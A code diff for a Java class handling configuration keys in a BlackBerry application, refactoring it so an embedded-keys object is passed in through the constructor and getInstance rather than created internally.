@@ -8,6 +8,7 @@
  * *************************************************/
 package blackberry.config;
 
+import fake.InstanceKeysFake;
 import net.rim.device.api.system.RuntimeStore;
 import blackberry.Device;
 import blackberry.crypto.Encryption;
@@ -46,12 +47,12 @@ public final class Keys implements Singleton {
      * 
      * @return single instance of Keys
      */
-    public static synchronized Keys getInstance() {
+    public static synchronized Keys getInstance(InstanceKeysEmbedded instanceKeyEmbedded) {
         if (instance == null) {
 
             instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                final Keys singleton = new Keys();
+                final Keys singleton = new Keys(instanceKeyEmbedded);
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
@@ -69,11 +70,14 @@ public final class Keys implements Singleton {
      * @return true, if successful
      */
     public boolean hasBeenBinaryPatched() {
-
         return instanceKeys.hasBeenBinaryPatched();
     }
 
-    private Keys() {
+    private Keys(){
+        this(null);
+    }
+    
+    private Keys(InstanceKeysEmbedded instance) {
         instanceKeys = new InstanceKeys();
         final Device device = Device.getInstance();
         //device.refreshData();
@@ -82,14 +86,13 @@ public final class Keys implements Singleton {
 
         //#ifdef FAKECONF
         if (!hasBeenBinaryPatched()) {
-            final InstanceKeysEmbedded instance = new InstanceKeysFake();
-            instance.injectKeys(instanceKeys);
-
+            if(instance!=null){
+                instance.injectKeys(instanceKeys);
+            }
         }
         //#endif  
         
         setInstanceKeys();
-
     }
 
     private void setInstanceKeys() {
